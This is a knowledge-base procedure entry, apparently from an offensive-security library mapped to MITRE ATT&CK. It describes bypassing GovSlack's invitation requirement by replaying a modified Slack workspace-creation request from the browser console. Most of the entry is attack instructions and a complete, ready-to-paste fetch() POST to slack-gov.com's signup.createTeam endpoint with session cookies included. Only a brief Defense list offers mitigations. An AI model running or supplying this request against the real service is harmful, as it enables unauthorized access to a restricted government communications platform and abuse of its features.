---
id: proc-uuid-003
tags:
  - auth-bypass
  - request-replay
  - api-exploit
type: procedure
tools:
  - '[[tools/Firefox-DevTools]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/fetch-create-slack-team]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:30:35.454Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
---
# Replay-Modified-Request-to-Create-GovSlack-Workspace

## Summary

This procedure modifies a captured Slack.com workspace creation request and replays it against the GovSlack API using session cookies, bypassing invitation requirements to create unauthorized workspaces.

## Description

The /api/signup.createTeam endpoint on slack-gov.com lacks proper domain-specific validation, allowing payloads from slack.com to succeed when augmented with GovSlack cookies. This step involves editing the fetch URL, injecting cookies via credentials: 'include', and executing in the browser console on slack-gov.com. The attack targets web-based API services, assuming prior capture of payload and cookies. Successful execution grants access to a new GovSlack instance (e.g., viomck.slack-gov.com) without exposing existing data but enabling feature abuse.

## Requirements

1. Captured fetch payload from slack.com
2. GovSlack session cookies
3. Browser console access on slack-gov.com

## Defense

Defensive measures and detection strategies:

- Validate request origins and require GovSlack-specific headers/tokens
- Audit API logs for cross-domain request patterns
- Restrict endpoint to authenticated sessions with workspace invite checks

## Objectives

1. Bypass GovSlack creation restrictions
2. Create new unauthorized workspace
3. Gain access to GovSlack environment

## Instructions

### Step 1: Modify the Fetch Request

**Context**: Update the captured payload to target GovSlack.

Take the copied fetch code, replace "slack.com" with "slack-gov.com" in the URL, and ensure the request includes credentials for cookie transmission.

**Expected Output**: Modified JavaScript snippet ready for execution.

### Step 2: Execute in Browser Console

**Context**: Replay the request on the GovSlack domain to create the workspace.

Navigate to slack-gov.com in Firefox, open DevTools Console, paste and run the modified [[commands/fetch-create-slack-team]] command.

**Command** ([[commands/fetch-create-slack-team]]):
```javascript
await fetch("https://slack-gov.com/api/signup.createTeam?_x_id=noversion-1667355054.372", { "credentials": "include", "headers": { "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Content-Type": "multipart/form-data; boundary=---------------------------34111059701841183173198228768", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin" }, "referrer": "https://slack-gov.com/get-started", "body": "-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"email_misc\"\r\n\r\ntrue\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"tz\"\r\n\r\nAmerica/Los_Angeles\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"locale\"\r\n\r\nen-US\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"last_tos_acknowledged\"\r\n\r\ntos_mar2018\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"login\"\r\n\r\ntrue\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"in_setup_experiment\"\r\n\r\ntrue\r\n-----------------------------34111059701841183173198228768--\r\n", "method": "POST", "mode": "cors" });
```

> This command sends a multipart/form-data POST with parameters like tz=America/Los_Angeles, locale=en-US, etc. Expected output is a JSON response with workspace details if successful.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Valid Accounts]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/fetch-create-slack-team]]

## Tools Used

- [[tools/Firefox-DevTools]]

## Tags

- auth-bypass
- request-replay
